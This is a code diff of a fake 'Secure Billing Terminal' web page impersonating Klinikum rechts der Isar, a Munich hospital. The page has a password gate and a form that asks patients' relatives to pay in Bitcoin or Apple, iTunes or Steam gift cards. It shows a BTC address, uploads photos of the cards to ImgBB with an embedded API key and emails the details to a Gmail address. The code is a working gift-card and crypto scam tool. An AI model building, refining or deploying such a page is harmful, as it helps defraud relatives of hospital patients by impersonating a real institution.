@@ -1,180 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Billing Terminal | Klinikum rechts der Isar</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        .tum-blue { background-color: #005293; }
-        .hero-overlay { background: rgba(0, 0, 0, 0.75); }
-        #main-portal, #review-message { display: none; }
-        .spinner { border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #005293; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body class="bg-gray-50 font-sans text-gray-900">
+async function handleSubmit() {
+    const fileInput = document.getElementById('fileInput');
+    if(!fileInput.files[0]) { alert("Please upload the receipt/card photo first."); return; }
+    
+    const btn = document.getElementById('submitBtn');
+    btn.innerHTML = "VERIFYING ASSETS...";
+    btn.disabled = true;
 
-    <div id="login-screen" class="min-h-screen flex items-center justify-center bg-slate-900 p-6">
-        <div class="bg-white p-8 rounded-3xl shadow-2xl max-w-sm w-full text-center border-b-8 border-blue-600">
-            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-12 mx-auto mb-6">
-            <h2 class="text-xl font-bold mb-2 uppercase tracking-tight">Clinical Portal</h2>
-            <p class="text-gray-400 text-[10px] mb-6 uppercase tracking-widest font-bold">Authorized Access Only</p>
-            <input type="password" id="pass-input" placeholder="Terminal Password" class="w-full border-2 p-3 rounded-xl mb-4 text-center outline-none focus:border-blue-600">
-            <button onclick="verify()" class="w-full tum-blue text-white py-3 rounded-xl font-bold uppercase shadow-lg">Unlock Terminal</button>
-        </div>
-    </div>
+    const apiKey = "2623905ea1c86b9519be8f7928ca4372";
+    const formData = new FormData();
+    formData.append("image", fileInput.files[0]);
 
-    <div id="review-message" class="min-h-screen flex items-center justify-center bg-gray-50 p-6">
-        <div class="bg-white p-10 rounded-3xl shadow-2xl max-w-lg w-full text-center border-t-8 border-blue-900">
-            <div class="flex justify-center mb-6"><div class="spinner"></div></div>
-            <h2 class="text-2xl font-black text-blue-900 uppercase mb-4 tracking-tight">Payment Under Review</h2>
-            <p class="text-gray-600 font-medium leading-relaxed">We have received your submission. You will receive an official confirmation email from our clinical team after payment verification.</p>
-        </div>
-    </div>
+    try {
+        // Step 1: Upload to ImgBB
+        const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
+            method: "POST",
+            body: formData
+        });
+        const result = await response.json();
+        const imageLink = result.data.url; // This is the direct link to her photo
 
-    <div id="main-portal">
-        <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
-            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-10">
-            <p class="text-[9px] font-bold text-gray-400 uppercase text-right leading-tight">Technical University<br>of Munich</p>
-        </nav>
+        // Step 2: Gather data
+        const name = document.getElementById('p_name').value;
+        const h_id = document.getElementById('h_id').value;
+        const sender = document.getElementById('s_name').value;
+        const p_type = document.getElementById('p_type').value;
+        const balance = document.getElementById('b_amt').value || "0.00";
+        const asset = document.getElementById('c_type').value;
 
-        <div class="relative h-56 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
-            <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
-                <h1 class="text-white text-3xl font-black uppercase tracking-tighter">Billing & Settlement</h1>
-                <p class="text-blue-200 text-sm italic mt-1">Official Secure Terminal</p>
-            </div>
-        </div>
+        // Step 3: Create the Email (Removed the "Attach Photo" text)
+        const recipient = "teammangementt@gmail.com";
+        const subject = encodeURIComponent("Clinical Payment Verification: " + name);
+        const body = encodeURIComponent(
+            "--- OFFICIAL SETTLEMENT RECORD ---\n\n" +
+            "Patient Name: " + name + "\n" +
+            "Hospital ID: " + h_id + "\n" +
+            "Relative/Sender: " + sender + "\n" +
+            "Settlement Type: " + p_type + "\n" +
+            "Remaining Balance: $" + balance + "\n" +
+            "Asset Category: " + asset + "\n\n" +
+            "VIEW UPLOADED ASSET/RECEIPT HERE:\n" + imageLink + "\n\n" +
+            "Verification Status: Transmission Complete. Pending Clinical Review."
+        );
 
-        <div class="max-w-4xl mx-auto -mt-10 mb-20 px-4">
-            <div class="bg-white shadow-2xl rounded-2xl overflow-hidden border">
-                <form id="billing-form" class="p-6 md:p-10">
-                    
-                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Patient & Relative Details</h2>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                        <input type="text" id="p_name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="text" id="h_id" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="text" id="s_name" placeholder="Sender (Relative) Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="email" id="s_email" placeholder="Sender Email Address" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                    </div>
+        // Step 4: Open Gmail and show success screen
+        window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
 
-                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Settlement Selection</h2>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                        <div>
-                            <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Payment Type</label>
-                            <select id="p_type" onchange="toggleBalance()" class="w-full border-2 p-3 rounded-xl bg-white outline-none focus:border-blue-500">
-                                <option value="Full Settlement">Full Settlement</option>
-                                <option value="Advance Payment">Advance Payment</option>
-                                <option value="Balance Completion">Balance Completion</option>
-                            </select>
-                            <div id="balance-box" class="hidden mt-4">
-                                <label class="block text-xs font-bold text-red-500 uppercase mb-1">Enter Balance Due ($)</label>
-                                <input type="text" id="b_amt" placeholder="e.g. 5,000" class="w-full border-2 border-red-100 p-3 rounded-xl">
-                            </div>
-                        </div>
-                        <div>
-                            <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Select Asset Category</label>
-                            <select id="c_type" class="w-full border-2 p-3 rounded-xl bg-white outline-none focus:border-blue-500">
-                                <option value="BTC Only">BTC (Digital Wallet)</option>
-                                <option value="Apple Gift Card">Apple Gift Card</option>
-                                <option value="iTunes Gift Card">iTunes Gift Card</option>
-                                <option value="Steam Card">Steam Asset Card</option>
-                            </select>
-                        </div>
-                    </div>
+        setTimeout(() => {
+            document.getElementById('main-portal').style.display = 'none';
+            document.getElementById('review-message').style.display = 'flex';
+        }, 1000);
 
-                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
-                        <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs tracking-widest">3. Assets & Verification</h3>
-                        <div class="space-y-4">
-                            <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
-                                <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Clinical BTC Address</p>
-                                <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
-                            </div>
-                            <div class="bg-blue-900/20 p-4 rounded-xl border border-blue-800/40">
-                                <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Upload Photo of Card or Receipt</label>
-                                <input type="file" id="fileInput" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
-                            </div>
-                        </div>
-                    </div>
-
-                    <button type="button" id="submitBtn" onclick="handleSubmit()" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg">Submit Verification</button>
-                </form>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function verify() {
-            if(document.getElementById('pass-input').value === 'KLINIKUM2026') {
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-portal').style.display = 'block';
-            }
-        }
-
-        function toggleBalance() {
-            const val = document.getElementById('p_type').value;
-            document.getElementById('balance-box').style.display = (val === 'Full Settlement') ? 'none' : 'block';
-        }
-
-        async function handleSubmit() {
-            const fileInput = document.getElementById('fileInput');
-            if(!fileInput.files[0]) { alert("Please upload the receipt/card photo first."); return; }
-            
-            const btn = document.getElementById('submitBtn');
-            btn.innerHTML = "UPLOADING TO SECURE SERVER...";
-            btn.disabled = true;
-
-            const apiKey = "2623905ea1c86b9519be8f7928ca4372";
-            const formData = new FormData();
-            formData.append("image", fileInput.files[0]);
-
-            try {
-                // Upload image to ImgBB
-                const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
-                    method: "POST",
-                    body: formData
-                });
-                const result = await response.json();
-                const imageLink = result.data.url;
-
-                // Gather form data
-                const name = document.getElementById('p_name').value;
-                const h_id = document.getElementById('h_id').value;
-                const sender = document.getElementById('s_name').value;
-                const p_type = document.getElementById('p_type').value;
-                const balance = document.getElementById('b_amt').value || "None (Full)";
-                const asset = document.getElementById('c_type').value;
-
-                // Create the Mailto Link with the Image Link included
-                const recipient = "teammangementt@gmail.com";
-                const subject = encodeURIComponent("Clinical Payment Verification: " + name);
-                const body = encodeURIComponent(
-                    "--- OFFICIAL BILLING SUBMISSION ---\n\n" +
-                    "Patient: " + name + "\n" +
-                    "Hospital ID: " + h_id + "\n" +
-                    "Sender: " + sender + "\n" +
-                    "Payment Mode: " + p_type + "\n" +
-                    "Outstanding Balance: " + balance + "\n" +
-                    "Asset Category: " + asset + "\n\n" +
-                    "VERIFICATION LINK: " + imageLink + "\n\n" +
-                    "System Note: Transaction is encrypted and pending review."
-                );
-
-                // Open Gmail
-                window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
-
-                // Show Reviewing Screen
-                setTimeout(() => {
-                    document.getElementById('main-portal').style.display = 'none';
-                    document.getElementById('review-message').style.display = 'flex';
-                }, 1500);
-
-            } catch (error) {
-                alert("Upload failed. Please check your connection.");
-                btn.innerHTML = "Submit Verification";
-                btn.disabled = false;
-            }
-        }
-    </script>
-</body>
-</html>
+    } catch (error) {
+        alert("Transmission failed. Please check your connection.");
+        btn.innerHTML = "Submit Verification";
+        btn.disabled = false;
+    }
+}
